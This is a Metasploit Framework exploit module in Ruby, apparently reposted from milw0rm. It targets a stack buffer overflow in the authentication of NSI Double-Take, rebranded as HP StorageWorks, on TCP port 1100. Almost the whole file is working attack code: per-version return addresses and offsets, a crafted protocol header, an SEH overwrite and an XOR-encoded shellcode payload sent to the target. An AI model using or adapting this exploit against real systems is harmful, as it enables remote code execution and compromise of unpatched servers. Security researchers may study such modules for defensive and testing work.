<html><head><title>HP StorageWorks NSI Double Take Remote Overflow Exploit (meta)</title></head><pre>##
# $Id: doubletake.rb 4529 2007-03-23 01:08:18Z $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Misc::Doubletake &lt; Msf::Exploit::Remote
	include Exploit::Remote::Tcp
	include Exploit::Remote::Seh
	def initialize(info = {})
		super(update_info(info,
			'Name'           =&gt; 'doubletake Overflow',
			'Description'    =&gt; %q{
					This Module Exploits a stack overflow in the authentication mechanism of NSI Doubletake which is also rebranded
					as hp storage works Vulnerability found by Titon of Bastard Labs.
			},
			'Author'         =&gt; [ 'ri0t &lt;ri0t[at]ri0tnet.net&gt;' ],
			'Version'        =&gt; '$Revision: 9 $',
			'References'     =&gt; 
				[
				],
			'DefaultOptions' =&gt;
				{
					'EXITFUNC' =&gt; 'process',
				},
			'Payload'        =&gt;
				{
					'Space'    =&gt; 500,
					'BadChars' =&gt; &quot;\x00&quot;,
				},
			'Platform'       =&gt; 'win',
			
			'Targets'        =&gt;
				[
					['doubletake 4.5.0',    { 'Ret' =&gt;  0x006f5fa7, 'Offset' =&gt; 5544 } ],
					['doubletake 4.4.2', { 'Ret' =&gt; 0x0074e307, 'Offset' =&gt; 944 } ],  
					['doubletake 4.5.0.1819', { 'Ret' =&gt; 0x006e62dd, 'Offset' =&gt; 5544 } ],
				],
			 'DefaultTarget' =&gt; 0,

			'Privileged'     =&gt; false,

			'DisclosureDate' =&gt; ''

			))

			register_options(
			[
				Opt::RPORT(1100)
			], self.class)
	end

	def exploit
                xor = Rex::Encoding::Xor::Byte
		connect

		print_status(&quot;Trying target #{target.name}...&quot;)

                header = 
               &quot;\x00\x02\x00\x01\x27\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;+
               &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x00&quot;+
               &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01&quot;+
               &quot;\x00\x00\x00\x1e\x00\x00\x00\x01\x00\x01&quot;

		filler =  rand_text_english(1) * (target['Offset'])
		seh = generate_seh_payload(target.ret)
                buffercoded= xor.encode(seh+payload.encoded, [0xf0].pack(&quot;C&quot;))
		sploit =  header + filler + buffercoded[0]
		sock.put(sploit)
		handler
		disconnect	
	end

end
end

# milw0rm.com [2008-06-04]</pre></html>